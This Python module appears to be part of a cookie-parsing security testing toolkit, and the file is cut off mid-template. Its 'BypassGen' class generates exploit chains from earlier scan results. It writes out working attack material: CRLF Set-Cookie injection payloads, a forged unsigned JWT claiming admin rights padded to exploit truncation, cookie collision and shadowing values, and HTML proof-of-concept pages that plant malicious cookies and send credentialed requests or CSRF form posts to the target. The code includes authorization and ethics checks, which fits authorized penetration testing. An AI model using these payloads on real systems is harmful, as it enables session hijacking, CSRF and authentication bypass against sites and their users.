"""
BypassGen: Auto-generate exploit chains for cookie parsing vulnerabilities.

This module analyzes the results from other modules (CookieBomb, ClientFork, ServerDrift)
to automatically generate potential exploit chains for security testing purposes.
"""

import json
import os
import random
import re
import string
import time
from typing import Any, Dict, List, Optional, Tuple, Union
from urllib.parse import quote, quote_plus, urljoin, urlparse

from .utils.common import (
    ethical_check,
    load_results,
    logger,
    rate_limit,
    safe_request,
    save_results,
    validate_authorization,
)
from .utils.cookie_utils import Cookie, create_cookie_collision, create_malformed_cookie


class BypassGen:
    """
    Generate exploit chains based on cookie parsing inconsistencies.
    """

    # Exploit templates
    EXPLOIT_TEMPLATES = {
        "session_fixation": {
            "name": "Session Fixation via Trailing-Space Collision",
            "description": "Exploits cookie name collisions where a server treats cookies with trailing spaces as the same cookie",
            "prerequisites": ["key_collisions"],
            "impact": "Session fixation, authentication bypass",
        },
        "csrf_disable": {
            "name": "CSRF Token Bypass via Ghost Cookie Injection",
            "description": "Exploits a behavior where injected cookies can override CSRF tokens",
            "prerequisites": ["header_injection"],
            "impact": "CSRF protection bypass",
        },
        "jwt_shadowing": {
            "name": "JWT Token Shadowing via Early Truncation",
            "description": "Exploits truncation behavior to replace JWT tokens with malicious values",
            "prerequisites": ["overlong_values", "key_overwrite"],
            "impact": "Authentication bypass, privilege escalation",
        },
        "path_override": {
            "name": "Path Override Reversal",
            "description": "Exploits inconsistencies in path matching behavior between client and server",
            "prerequisites": ["path_scoping"],
            "impact": "Cookie scope bypass, authentication bypass",
        },
        "casing_inversion": {
            "name": "Casing Inversion Drift",
            "description": "Exploits case-sensitivity differences in cookie handling",
            "prerequisites": ["key_overwrite"],
            "impact": "Session hijacking, authentication bypass",
        },
        "quote_leak": {
            "name": "Quote Leak Reflection",
            "description": "Exploits quote handling in cookie values to cause parsing inconsistencies",
            "prerequisites": ["malformed_cookies"],
            "impact": "WAF bypass, SSRF",
        },
        "delimiter_exploit": {
            "name": "Trailing Delimiter Exploit",
            "description": "Exploits inconsistent handling of trailing delimiters in cookies",
            "prerequisites": ["whitespace_ambiguity"],
            "impact": "Cookie parser bypass, WAF evasion",
        },
        "shadow_cookie": {
            "name": "Shadow Cookie Attack",
            "description": "Sets a parallel cookie with the same name but different attributes",
            "prerequisites": ["cookie_shadowing"],
            "impact": "Session hijacking, cookie attribute bypass",
        },
    }

    def __init__(
        self,
        target: str,
        output_dir: str = "./results",
        results_dir: Optional[str] = None,
        auth_file: Optional[str] = None,
        rate_limit_delay: float = 1.0,
        verify_exploits: bool = False,
        verbose: bool = False,
    ):
        """
        Initialize the BypassGen module.

        Args:
            target: Target URL to test
            output_dir: Directory to save exploit results
            results_dir: Directory containing previous test results
            auth_file: Path to authorization file
            rate_limit_delay: Delay between requests in seconds
            verify_exploits: Whether to verify generated exploits
            verbose: Enable verbose logging
        """
        self.target = target
        self.output_dir = output_dir
        self.results_dir = results_dir if results_dir else output_dir
        self.auth_file = auth_file
        self.rate_limit_delay = rate_limit_delay
        self.verify_exploits = verify_exploits
        self.verbose = verbose

        if verbose:
            logger.setLevel("DEBUG")

        parsed_url = urlparse(target)
        self.hostname = parsed_url.netloc
        self.scheme = parsed_url.scheme

        # Validation
        if not target.startswith(("http://", "https://")):
            raise ValueError("Target URL must start with http:// or https://")

        if not ethical_check(target):
            raise ValueError(f"Target {target} failed ethical check")

        if not validate_authorization(target, auth_file):
            raise ValueError(f"Not authorized to test {target}")

        self.results = {"target": target, "timestamp": time.time(), "exploits": {}}

        # Load results from other modules if available
        self.cookiebomb_results = self.load_module_results("cookiebomb")
        self.clientfork_results = self.load_module_results("clientfork")
        self.serverdrift_results = self.load_module_results("serverdrift")

        # Determine which exploits are applicable based on loaded results
        self.applicable_exploits = self.determine_applicable_exploits()
        logger.info(f"Identified {len(self.applicable_exploits)} potentially applicable exploits")

    def load_module_results(self, module_name: str) -> Optional[Dict[str, Any]]:
        """
        Load the most recent results for a specific module.

        Args:
            module_name: Name of the module to load results for

        Returns:
            Dict[str, Any] or None: Module results or None if not found
        """
        # Look for the most recent results file
        pattern = f"{module_name}_{self.hostname}_"

        result_files = []
        for filename in os.listdir(self.results_dir):
            if filename.startswith(pattern) and filename.endswith(".json"):
                file_path = os.path.join(self.results_dir, filename)
                result_files.append((file_path, os.path.getmtime(file_path)))

        if not result_files:
            logger.warning(f"No results found for {module_name}")
            return None

        # Get the most recent file
        most_recent = sorted(result_files, key=lambda x: x[1], reverse=True)[0][0]

        try:
            with open(most_recent, "r") as f:
                data = json.load(f)

            logger.info(f"Loaded {module_name} results from {most_recent}")
            return data

        except (json.JSONDecodeError, IOError) as e:
            logger.error(f"Failed to load {module_name} results: {str(e)}")
            return None

    def determine_applicable_exploits(self) -> List[str]:
        """
        Determine which exploits are applicable based on test results.

        Returns:
            List[str]: List of applicable exploit names
        """
        applicable = []

        # Check each exploit template against available results
        for exploit_name, exploit_info in self.EXPLOIT_TEMPLATES.items():
            prerequisites = exploit_info["prerequisites"]
            missing_prereqs = []

            for prereq in prerequisites:
                # Check if we have results for this prerequisite
                if self.cookiebomb_results and prereq in self.cookiebomb_results.get("tests", {}):
                    continue
                elif self.clientfork_results and prereq in self.clientfork_results.get("tests", {}):
                    continue
                elif self.serverdrift_results and prereq in self.serverdrift_results.get(
                    "tests", {}
                ):
                    continue
                else:
                    missing_prereqs.append(prereq)

            if not missing_prereqs:
                applicable.append(exploit_name)
                logger.debug(f"Exploit {exploit_name} is applicable")
            else:
                logger.debug(
                    f"Exploit {exploit_name} is not applicable, missing: {', '.join(missing_prereqs)}"
                )

        return applicable

    def generate_session_fixation_exploit(self) -> Dict[str, Any]:
        """
        Generate a session fixation exploit using trailing-space collisions.

        Returns:
            Dict[str, Any]: Exploit details
        """
        exploit_info = self.EXPLOIT_TEMPLATES["session_fixation"]

        # Extract key collision test results
        collision_results = None
        if self.cookiebomb_results and "key_collisions" in self.cookiebomb_results.get("tests", {}):
            collision_results = self.cookiebomb_results["tests"]["key_collisions"]

        if not collision_results:
            return {
                "name": exploit_info["name"],
                "status": "skipped",
                "reason": "No key collision test results available",
            }

        # Generate exploit
        session_cookie_name = collision_results.get("cookie_names", ["session"])[0]
        original_value = "original_session"
        attacker_value = "attacker_controlled_session"

        # Create cookies with trailing space variations
        cookie_variations = [
            {
                "original": f"{session_cookie_name}={original_value}",
                "malformed": f"{session_cookie_name} ={original_value}",
            },
            {
                "original": f"{session_cookie_name}={original_value}",
                "malformed": f"{session_cookie_name}= {original_value}",
            },
            {
                "original": f"{session_cookie_name}={original_value}",
                "malformed": f"{session_cookie_name} = {original_value}",
            },
        ]

        # Test each variation
        results = []
        for variation in cookie_variations:
            if self.verify_exploits:
                # Test the original cookie
                rate_limit(self.rate_limit_delay)
                original_response = safe_request(
                    self.target, headers={"Cookie": variation["original"]}
                )

                # Test the malformed cookie
                rate_limit(self.rate_limit_delay)
                malformed_response = safe_request(
                    self.target, headers={"Cookie": variation["malformed"]}
                )

                if original_response and malformed_response:
                    result = {
                        "variation": variation,
                        "original_status": original_response.status_code,
                        "malformed_status": malformed_response.status_code,
                        "match": original_response.status_code == malformed_response.status_code,
                        "original_cookies": dict(original_response.cookies),
                        "malformed_cookies": dict(malformed_response.cookies),
                    }

                    results.append(result)
            else:
                # Just include the variations without testing
                results.append({"variation": variation})

        # Generate exploit steps
        exploit_steps = [
            f"1. Identify a target site that uses {session_cookie_name} cookies for session management",
            f"2. Generate a valid session by authenticating to the site",
            f"3. Use the cookie {session_cookie_name}={attacker_value} as the attacker",
            f"4. Create a malicious link/page that sets a cookie with trailing spaces: {session_cookie_name} ={attacker_value}",
            "5. If the server treats these as the same cookie but the client stores them separately, the victim's session may be fixed to the attacker's value",
        ]

        return {
            "name": exploit_info["name"],
            "status": "generated",
            "description": exploit_info["description"],
            "impact": exploit_info["impact"],
            "cookie_name": session_cookie_name,
            "variations": cookie_variations,
            "test_results": results,
            "steps": exploit_steps,
            "poc_html": self.generate_html_poc(
                "session_fixation", session_cookie_name, attacker_value
            ),
        }

    def generate_csrf_disable_exploit(self) -> Dict[str, Any]:
        """
        Generate a CSRF token bypass exploit using ghost cookie injection.

        Returns:
            Dict[str, Any]: Exploit details
        """
        exploit_info = self.EXPLOIT_TEMPLATES["csrf_disable"]

        # Extract header injection test results
        injection_results = None
        if self.clientfork_results and "header_injection" in self.clientfork_results.get(
            "tests", {}
        ):
            injection_results = self.clientfork_results["tests"]["header_injection"]

        if not injection_results:
            return {
                "name": exploit_info["name"],
                "status": "skipped",
                "reason": "No header injection test results available",
            }

        # Look for potential CSRF token names
        csrf_token_names = [
            "csrf_token",
            "csrftoken",
            "_csrf",
            "CSRF-TOKEN",
            "csrf",
            "CSRFToken",
            "xsrf",
            "X-CSRF-TOKEN",
        ]

        # Check if any browsers were vulnerable to header injection
        vulnerable_browsers = []
        for browser_name, result in injection_results.get("browser_results", {}).items():
            if result.get("injection_succeeded", False):
                vulnerable_browsers.append(browser_name)

        if not vulnerable_browsers:
            return {
                "name": exploit_info["name"],
                "status": "skipped",
                "reason": "No browsers vulnerable to header injection found",
            }

        # Generate exploit
        csrf_cookie_name = csrf_token_names[0]  # Use the first as default
        attacker_value = "attacker_csrf_token"

        # Create CRLF payloads
        crlf_payloads = [
            f"https://victim.com\r\nSet-Cookie: {csrf_cookie_name}={attacker_value}; Path=/",
            f"https://victim.com\r\nSet-Cookie: {csrf_cookie_name}={attacker_value}; Path=/; SameSite=None",
            f"https://victim.com\n\rSet-Cookie: {csrf_cookie_name}={attacker_value}; Path=/",
        ]

        # URL-encode for usage in redirects
        encoded_payloads = [quote(payload) for payload in crlf_payloads]

        # Generate exploit steps
        exploit_steps = [
            f"1. Identify a target site that uses {csrf_cookie_name} cookies for CSRF protection",
            "2. Create a malicious site that generates a redirect with CRLF injection",
            f"3. Use the redirect URL with CRLF payload: {crlf_payloads[0]}",
            "4. If the browser processes the injected Set-Cookie header, the victim's CSRF token may be overwritten",
            "5. Use the overwritten CSRF token to perform CSRF attacks that bypass protection",
        ]

        return {
            "name": exploit_info["name"],
            "status": "generated",
            "description": exploit_info["description"],
            "impact": exploit_info["impact"],
            "cookie_name": csrf_cookie_name,
            "vulnerable_browsers": vulnerable_browsers,
            "crlf_payloads": crlf_payloads,
            "encoded_payloads": encoded_payloads,
            "steps": exploit_steps,
            "poc_html": self.generate_html_poc("csrf_disable", csrf_cookie_name, attacker_value),
        }

    def generate_jwt_shadowing_exploit(self) -> Dict[str, Any]:
        """
        Generate a JWT token shadowing exploit via truncation.

        Returns:
            Dict[str, Any]: Exploit details
        """
        exploit_info = self.EXPLOIT_TEMPLATES["jwt_shadowing"]

        # Extract overlong_values test results
        overlong_results = None
        if self.cookiebomb_results and "overlong_values" in self.cookiebomb_results.get(
            "tests", {}
        ):
            overlong_results = self.cookiebomb_results["tests"]["overlong_values"]

        key_overwrite_results = None
        if self.serverdrift_results and "key_overwrite" in self.serverdrift_results.get(
            "tests", {}
        ):
            key_overwrite_results = self.serverdrift_results["tests"]["key_overwrite"]

        if not overlong_results or not key_overwrite_results:
            missing = []
            if not overlong_results:
                missing.append("overlong_values")
            if not key_overwrite_results:
                missing.append("key_overwrite")

            return {
                "name": exploit_info["name"],
                "status": "skipped",
                "reason": f"Missing test results: {', '.join(missing)}",
            }

        # Check if any truncation was detected
        truncation_detected = False
        truncation_length = 0

        for result in overlong_results.get("results", []):
            if result.get("truncated", False):
                truncation_detected = True
                truncation_length = result.get("truncated_length", 0)
                break

        if not truncation_detected:
            return {
                "name": exploit_info["name"],
                "status": "skipped",
                "reason": "No cookie value truncation detected",
            }

        # Generate exploit
        jwt_cookie_name = "jwt"
        valid_jwt_prefix = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."  # JWT header
        attacker_jwt = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJhZG1pbiI6dHJ1ZX0."

        # Create padding to push the attacker's JWT past the truncation point
        padding_length = truncation_length - len(valid_jwt_prefix)
        if padding_length > 0:
            padding = "A" * padding_length
            shadowed_jwt = f"{valid_jwt_prefix}{padding}{attacker_jwt}"
        else:
            shadowed_jwt = f"{valid_jwt_prefix}{attacker_jwt}"

        # Generate exploit steps
        exploit_steps = [
            f"1. Identify a target site that uses {jwt_cookie_name} cookies for JWT tokens",
            f"2. Determine the truncation length for cookie values ({truncation_length} bytes detected)",
            f"3. Create a valid JWT token prefix that will be retained after truncation: {valid_jwt_prefix}",
            f"4. Append padding to reach the truncation point: {padding_length} bytes",
            f"5. Append the attacker's forged JWT with admin privileges",
            "6. If the server truncates the cookie value but still processes it as a JWT, privilege escalation may occur",
        ]

        return {
            "name": exploit_info["name"],
            "status": "generated",
            "description": exploit_info["description"],
            "impact": exploit_info["impact"],
            "cookie_name": jwt_cookie_name,
            "truncation_length": truncation_length,
            "valid_jwt_prefix": valid_jwt_prefix,
            "attacker_jwt": attacker_jwt,
            "shadowed_jwt": shadowed_jwt,
            "steps": exploit_steps,
            "poc_html": self.generate_html_poc("jwt_shadowing", jwt_cookie_name, shadowed_jwt),
        }

    def generate_path_override_exploit(self) -> Dict[str, Any]:
        """
        Generate a path override reversal exploit.

        Returns:
            Dict[str, Any]: Exploit details
        """
        exploit_info = self.EXPLOIT_TEMPLATES["path_override"]

        # Extract path scoping test results
        path_results = None
        if self.cookiebomb_results and "path_scoping" in self.cookiebomb_results.get("tests", {}):
            path_results = self.cookiebomb_results["tests"]["path_scoping"]

        if not path_results:
            return {
                "name": exploit_info["name"],
                "status": "skipped",
                "reason": "No path scoping test results available",
            }

        # Generate exploit
        session_cookie_name = "session"
        normal_path = "/admin"
        encoded_path = "/%61dmin"  # URL-encoded 'a'
        attacker_value = "attacker_session"

        # Create path variations
        path_variations = [
            {"path": normal_path, "encoded": encoded_path},
            {"path": "/api/v1", "encoded": "/api/v%31"},
            {"path": "/dashboard", "encoded": "/d%61shboard"},
        ]

        # Test if the server handles encoded paths differently
        results = []

        if self.verify_exploits:
            for variation in path_variations:
                # Test cookie with normal path
                normal_cookie = f"{session_cookie_name}=test_value; Path={variation['path']}"

                rate_limit(self.rate_limit_delay)
                normal_response = safe_request(self.target, headers={"Cookie": normal_cookie})

                # Test cookie with encoded path
                encoded_cookie = f"{session_cookie_name}=test_value; Path={variation['encoded']}"

                rate_limit(self.rate_limit_delay)
                encoded_response = safe_request(self.target, headers={"Cookie": encoded_cookie})

                if normal_response and encoded_response:
                    result = {
                        "variation": variation,
                        "normal_status": normal_response.status_code,
                        "encoded_status": encoded_response.status_code,
                        "match": normal_response.status_code == encoded_response.status_code,
                        "normal_cookies": dict(normal_response.cookies),
                        "encoded_cookies": dict(encoded_response.cookies),
                    }

                    results.append(result)
        else:
            # Just include the variations without testing
            results = [{"variation": variation} for variation in path_variations]

        # Generate exploit steps
        exploit_steps = [
            f"1. Identify a target site that uses path-scoped cookies for sensitive areas (e.g., {normal_path})",
            f"2. Generate a valid session cookie bound to a specific path: {session_cookie_name}=value; Path={normal_path}",
            f"3. Create a malicious cookie with the same name but using encoded path: {session_cookie_name}={attacker_value}; Path={encoded_path}",
            "4. If the server treats these paths differently than the browser, the encoded path cookie may be sent to the original path",
            "5. This can bypass SameSite=Lax restrictions and potentially enable session hijacking",
        ]

        return {
            "name": exploit_info["name"],
            "status": "generated",
            "description": exploit_info["description"],
            "impact": exploit_info["impact"],
            "cookie_name": session_cookie_name,
            "path_variations": path_variations,
            "test_results": results,
            "steps": exploit_steps,
            "poc_html": self.generate_html_poc(
                "path_override", session_cookie_name, attacker_value, normal_path, encoded_path
            ),
        }

    def generate_casing_inversion_exploit(self) -> Dict[str, Any]:
        """
        Generate a casing inversion drift exploit.

        Returns:
            Dict[str, Any]: Exploit details
        """
        exploit_info = self.EXPLOIT_TEMPLATES["casing_inversion"]

        # Extract key overwrite test results
        overwrite_results = None
        if self.serverdrift_results and "key_overwrite" in self.serverdrift_results.get(
            "tests", {}
        ):
            overwrite_results = self.serverdrift_results["tests"]["key_overwrite"]

        if not overwrite_results:
            return {
                "name": exploit_info["name"],
                "status": "skipped",
                "reason": "No key overwrite test results available",
            }

        # Check for case variation test
        case_test_results = None
        for result in overwrite_results.get("results", []):
            if result.get("format") == "case_variations":
                case_test_results = result
                break

        if not case_test_results:
            return {
                "name": exploit_info["name"],
                "status": "skipped",
                "reason": "No case variation test results found",
            }

        # Generate exploit
        session_cookie_name = "sessionID"
        lowercase_name = session_cookie_name.lower()
        uppercase_name = session_cookie_name.upper()

        evil_value = "evil_session"
        valid_value = "valid_session"

        # Create casing variations
        case_variations = [
            {
                "original": f"{session_cookie_name}={valid_value}",
                "malformed": f"{lowercase_name}={evil_value}",
            },
            {
                "original": f"{session_cookie_name}={valid_value}",
                "malformed": f"{uppercase_name}={evil_value}",
            },
            {
                "original": f"{session_cookie_name}={valid_value}",
                "malformed": f"{session_cookie_name[0].swapcase() + session_cookie_name[1:]}={evil_value}",
            },
        ]

        # Test each variation
        results = []

        if self.verify_exploits:
            for variation in case_variations:
                # Test with both cookies
                combined_cookie = f"{variation['original']}; {variation['malformed']}"

                rate_limit(self.rate_limit_delay)
                response = safe_request(self.target, headers={"Cookie": combined_cookie})

                if response:
                    result = {
                        "variation": variation,
                        "status_code": response.status_code,
                        "cookies": dict(response.cookies),
                        "headers": dict(response.headers),
                    }

                    # Check response for clues about which value was used
                    if evil_value in response.text:
                        result["evil_value_found"] = True
                    if valid_value in response.text:
                        result["valid_value_found"] = True

                    results.append(result)
        else:
            # Just include the variations without testing
            results = [{"variation": variation} for variation in case_variations]

        # Generate exploit steps
        exploit_steps = [
            f"1. Identify a target site that uses {session_cookie_name} cookies for session management",
            f"2. Determine if the site is case-sensitive in cookie access (e.g., Java Spring)",
            f"3. Create a legitimate cookie for the user: {session_cookie_name}={valid_value}",
            f"4. Inject a malicious cookie with different case: {lowercase_name}={evil_value}",
            "5. If the server accesses cookies with one case but processes them with another, the attacker's cookie may take precedence",
        ]

        return {
            "name": exploit_info["name"],
            "status": "generated",
            "description": exploit_info["description"],
            "impact": exploit_info["impact"],
            "cookie_name": session_cookie_name,
            "case_variations": case_variations,
            "test_results": results,
            "steps": exploit_steps,
            "poc_html": self.generate_html_poc(
                "casing_inversion", session_cookie_name, evil_value, lowercase_name
            ),
        }

    def generate_quote_leak_exploit(self) -> Dict[str, Any]:
        """
        Generate a quote leak reflection exploit.

        Returns:
            Dict[str, Any]: Exploit details
        """
        exploit_info = self.EXPLOIT_TEMPLATES["quote_leak"]

        # Extract malformed cookies test results
        malformed_results = None
        if self.serverdrift_results and "malformed_cookies" in self.serverdrift_results.get(
            "tests", {}
        ):
            malformed_results = self.serverdrift_results["tests"]["malformed_cookies"]

        if not malformed_results:
            return {
                "name": exploit_info["name"],
                "status": "skipped",
                "reason": "No malformed cookies test results available",
            }

        # Check for quoted value test
        quoted_test_results = None
        for result in malformed_results.get("results", []):
            if result.get("malformation") == "quoted_value":
                quoted_test_results = result
                break

        if not quoted_test_results:
            return {
                "name": exploit_info["name"],
                "status": "skipped",
                "reason": "No quoted value test results found",
            }

        # Generate exploit
        cookie_name = "host"

        # Create payloads with quotes that might confuse WAFs or parsers
        payloads = [
            f'{cookie_name}="attacker.com',
            f'{cookie_name}="attacker.com"',
            f'{cookie_name}="attacker.com";',
            f'{cookie_name}=something"attacker.com',
            f'{cookie_name}=attacker.com"',
            f'{cookie_name}="127.0.0.1:8080"',
            f'{cookie_name}="internal-api"',
        ]

        # Test each payload
        results = []

        if self.verify_exploits:
            for payload in payloads:
                rate_limit(self.rate_limit_delay)
                response = safe_request(self.target, headers={"Cookie": payload})

                if response:
                    result = {
                        "payload": payload,
                        "status_code": response.status_code,
                        "cookies": dict(response.cookies),
                        "headers": dict(response.headers),
                    }

                    # Check for error indicators
                    response_body = response.text.lower()
                    error_indicators = [
                        "error",
                        "exception",
                        "invalid",
                        "malformed",
                        "syntax",
                        "parse",
                        "cookie",
                        "format",
                    ]

                    errors_found = [
                        indicator
                        for indicator in error_indicators
                        if indicator in response_body[:1000]
                    ]
                    result["possible_errors"] = errors_found

                    results.append(result)
        else:
            # Just include the payloads without testing
            results = [{"payload": payload} for payload in payloads]

        # Generate exploit steps
        exploit_steps = [
            f"1. Identify a target site that processes cookies for host validation, proxy decisions, or SSRF filtering",
            f"2. Create cookies with quote-wrapped values that might confuse parsers: {payloads[1]}",
            f'3. If different layers parse the quotes differently, a value like "{cookie_name}="attacker.com"" might be processed as different values',
            "4. This can bypass WAF rules or SSRF protection and potentially allow server-side requests to attacker-controlled domains",
        ]

        return {
            "name": exploit_info["name"],
            "status": "generated",
            "description": exploit_info["description"],
            "impact": exploit_info["impact"],
            "cookie_name": cookie_name,
            "payloads": payloads,
            "test_results": results,
            "steps": exploit_steps,
            "poc_html": self.generate_html_poc("quote_leak", cookie_name, payloads[1]),
        }

    def generate_delimiter_exploit(self) -> Dict[str, Any]:
        """
        Generate a trailing delimiter exploit.

        Returns:
            Dict[str, Any]: Exploit details
        """
        exploit_info = self.EXPLOIT_TEMPLATES["delimiter_exploit"]

        # Extract whitespace ambiguity test results
        whitespace_results = None
        if self.cookiebomb_results and "whitespace_ambiguity" in self.cookiebomb_results.get(
            "tests", {}
        ):
            whitespace_results = self.cookiebomb_results["tests"]["whitespace_ambiguity"]

        if not whitespace_results:
            return {
                "name": exploit_info["name"],
                "status": "skipped",
                "reason": "No whitespace ambiguity test results available",
            }

        # Generate exploit
        cookie_name = "session"
        cookie_value = "valid_session"

        # Create payloads with trailing delimiters
        payloads = [
            f"{cookie_name}={cookie_value};;;",
            f"{cookie_name}={cookie_value};  ;",
            f"{cookie_name}={cookie_value} ; ; ;",
            f"{cookie_name}={cookie_value}; {cookie_name}=evil_value",
        ]

        # Test each payload
        results = []

        if self.verify_exploits:
            for payload in payloads:
                rate_limit(self.rate_limit_delay)
                response = safe_request(self.target, headers={"Cookie": payload})

                if response:
                    result = {
                        "payload": payload,
                        "status_code": response.status_code,
                        "cookies": dict(response.cookies),
                        "headers": dict(response.headers),
                    }

                    results.append(result)
        else:
            # Just include the payloads without testing
            results = [{"payload": payload} for payload in payloads]

        # Generate exploit steps
        exploit_steps = [
            f"1. Identify a target site that uses regex-based cookie validation",
            f"2. Create cookies with trailing semicolons that browsers drop but servers might process: {payloads[0]}",
            f"3. If the server's parser handles the trailing delimiters differently than expected, validation might be bypassed",
            f"4. Advanced variant: {payloads[3]} - If trailing delimiter confuses the parser, the evil value might be processed",
        ]

        return {
            "name": exploit_info["name"],
            "status": "generated",
            "description": exploit_info["description"],
            "impact": exploit_info["impact"],
            "cookie_name": cookie_name,
            "payloads": payloads,
            "test_results": results,
            "steps": exploit_steps,
            "poc_html": self.generate_html_poc(
                "delimiter_exploit", cookie_name, cookie_value, ";;;"
            ),
        }

    def generate_shadow_cookie_exploit(self) -> Dict[str, Any]:
        """
        Generate a shadow cookie attack exploit.

        Returns:
            Dict[str, Any]: Exploit details
        """
        exploit_info = self.EXPLOIT_TEMPLATES["shadow_cookie"]

        # Extract cookie shadowing test results
        shadowing_results = None
        if self.clientfork_results and "cookie_shadowing" in self.clientfork_results.get(
            "tests", {}
        ):
            shadowing_results = self.clientfork_results["tests"]["cookie_shadowing"]

        if not shadowing_results:
            return {
                "name": exploit_info["name"],
                "status": "skipped",
                "reason": "No cookie shadowing test results available",
            }

        # Check if any browsers were vulnerable to cookie shadowing
        vulnerable_browsers = []
        for browser_name, result in shadowing_results.get("browser_results", {}).items():
            if result.get("shadow_success", False):
                vulnerable_browsers.append(browser_name)

        if not vulnerable_browsers:
            return {
                "name": exploit_info["name"],
                "status": "skipped",
                "reason": "No browsers vulnerable to cookie shadowing found",
            }

        # Generate exploit
        cookie_name = shadowing_results.get("cookie_name", "session")
        secure_value = "original_secure_value"
        shadow_value = "shadow_insecure_value"

        # Create secure and shadow cookies
        secure_cookie = f"{cookie_name}={secure_value}; Secure; HttpOnly; SameSite=Strict; Path=/"
        shadow_cookie = f"{cookie_name}={shadow_value}; Path=/"

        # Generate exploit steps
        exploit_steps = [
            f"1. Identify a target site that uses {cookie_name} cookies for session management with Secure and HttpOnly flags",
            f"2. Wait for the user to establish a secure session: {secure_cookie}",
            f"3. Using a sub-resource load over HTTP or XSS, set a parallel cookie: {shadow_cookie}",
            f"4. If the application reads req.cookies.{cookie_name} without verifying security context, it may use the shadow cookie",
            f"5. This bypasses HttpOnly protection and may allow session hijacking even with SameSite protection",
        ]

        return {
            "name": exploit_info["name"],
            "status": "generated",
            "description": exploit_info["description"],
            "impact": exploit_info["impact"],
            "cookie_name": cookie_name,
            "secure_cookie": secure_cookie,
            "shadow_cookie": shadow_cookie,
            "vulnerable_browsers": vulnerable_browsers,
            "steps": exploit_steps,
            "poc_html": self.generate_html_poc("shadow_cookie", cookie_name, shadow_value),
        }

    def generate_html_poc(
        self, exploit_type: str, cookie_name: str, cookie_value: str, *args
    ) -> str:
        """
        Generate an HTML proof of concept for the exploit.

        Args:
            exploit_type: Type of exploit
            cookie_name: Name of the cookie to exploit
            cookie_value: Value of the cookie to set
            *args: Additional arguments specific to the exploit type

        Returns:
            str: HTML proof of concept
        """
        if exploit_type == "session_fixation":
            return f"""
<!DOCTYPE html>
<html>
<head>
    <title>Session Fixation PoC</title>
</head>
<body>
    <h1>Cookie Confusion: Session Fixation via Trailing Space</h1>
    <script>
    // Set the malicious cookie with trailing space
    document.cookie = "{cookie_name} ={cookie_value}; path=/";
    
    // Check what cookies are set
    console.log("Cookies:", document.cookie);
    </script>
    
    <div id="cookies"></div>
    
    <script>
    // Display the cookies
    document.getElementById('cookies').innerText = "Current cookies: " + document.cookie;
    </script>
</body>
</html>
"""

        elif exploit_type == "csrf_disable":
            return f"""
<!DOCTYPE html>
<html>
<head>
    <title>CSRF Token Bypass PoC</title>
</head>
<body>
    <h1>Cookie Confusion: CSRF Token Bypass</h1>
    <script>
    // Set the malicious CSRF token
    document.cookie = "{cookie_name}={cookie_value}; path=/";
    
    // Now submit a form to the target
    function submitCSRF() {{
        document.getElementById('csrf-form').submit();
    }}
    </script>
    
    <form id="csrf-form" action="{self.target}/api/action" method="POST">
        <input type="hidden" name="action" value="change_settings">
        <input type="hidden" name="new_value" value="attacker_controlled">
    </form>
    
    <button onclick="submitCSRF()">Click me to test CSRF</button>
    
    <div id="cookies"></div>
    
    <script>
    // Display the cookies
    document.getElementById('cookies').innerText = "Current cookies: " + document.cookie;
    </script>
</body>
</html>
"""

        elif exploit_type == "jwt_shadowing":
            return f"""
<!DOCTYPE html>
<html>
<head>
    <title>JWT Shadowing PoC</title>
</head>
<body>
    <h1>Cookie Confusion: JWT Shadowing via Truncation</h1>
    <script>
    // Set the long JWT token that will be truncated
    document.cookie = "{cookie_name}={cookie_value}; path=/";
    
    // Make a request to the API that uses JWT
    async function testJWT() {{
        const response = await fetch('{self.target}/api/profile', {{
            method: 'GET',
            credentials: 'include'
        }});
        
        const result = await response.text();
        document.getElementById('result').innerText = result;
    }}
    </script>
    
    <button onclick="testJWT()">Test JWT Shadowing</button>
    
    <div id="result">Results will appear here...</div>
    
    <div id="cookies"></div>
    
    <script>
    // Display the cookies
    document.getElementById('cookies').innerText = "Current cookies: " + document.cookie;
    </script>
</body>
</html>
"""

        elif exploit_type == "path_override":
            normal_path = args[0] if args else "/admin"
            encoded_path = args[1] if len(args) > 1 else "/%61dmin"

            return f"""
<!DOCTYPE html>
<html>
<head>
    <title>Path Override PoC</title>
</head>
<body>
    <h1>Cookie Confusion: Path Override Reversal</h1>
    <script>
    // First set a cookie for the normal path
    document.cookie = "original_{cookie_name}=original_value; path={normal_path}";
    
    // Then set the cookie with encoded path
    document.cookie = "{cookie_name}={cookie_value}; path={encoded_path}";
    
    // Make a request to the admin path
    async function testPathOverride() {{
        const response = await fetch('{self.target}{normal_path}', {{
            method: 'GET',
            credentials: 'include'
        }});
        
        const result = await response.text();
        document.getElementById('result').innerText = "Admin path response length: " + result.length;
    }}
    </script>
    
    <button onclick="testPathOverride()">Test Path Override</button>
    
    <div id="result">Results will appear here...</div>
    
    <div id="cookies"></div>
    
    <script>
    // Display the cookies
    document.getElementById('cookies').innerText = "Current cookies: " + document.cookie;
    </script>
</body>
</html>
"""

        elif exploit_type == "casing_inversion":
            lowercase_name = args[0] if args else cookie_name.lower()

            return f"""
<!DOCTYPE html>
<html>
<head>
    <title>Casing Inversion PoC</title>
</head>
<body>
    <h1>Cookie Confusion: Casing Inversion Drift</h1>
    <script>
    // Set the original cookie
    document.cookie = "{cookie_name}=original_value; path=/";
    
    // Set the lowercase variant with evil value
    document.cookie = "{lowercase_name}={cookie_value}; path=/";
    
    // Make a request to check which is used
    async function testCasingInversion() {{
        const response = await fetch('{self.target}/api/check', {{
            method: 'GET',
            credentials: 'include'
        }});
        
        const result = await response.text();
        document.getElementById('result').innerText = result;
    }}
    </script>
    
    <button onclick="testCasingInversion()">Test Casing Inversion</button>
    
    <div id="result">Results will appear here...</div>
    
    <div id="cookies"></div>
    
    <script>
    // Display the cookies
    document.getElementById('cookies').innerText = "Current cookies: " + document.cookie;
    </script>
</body>
</html>
"""

        elif exploit_type == "quote_leak":
            return f"""
<!DOCTYPE html>
<html>
<head>
    <title>Quote Leak PoC</title>
</head>
<body>
    <h1>Cookie Confusion: Quote Leak Reflection</h1>
    <script>
    // Set the cookie with quotes that might confuse parsers
    document.cookie = '{cookie_name}={cookie_value}; path=/';
    
    // Test the endpoint
    async function testQuoteLeak() {{
        const response = await fetch('{self.target}/api/fetch', {{
            method: 'GET',
            credentials: 'include'
        }});
        
        const result = await response.text();
        document.getElementById('result').innerText = result;
    }}
    </script>
    
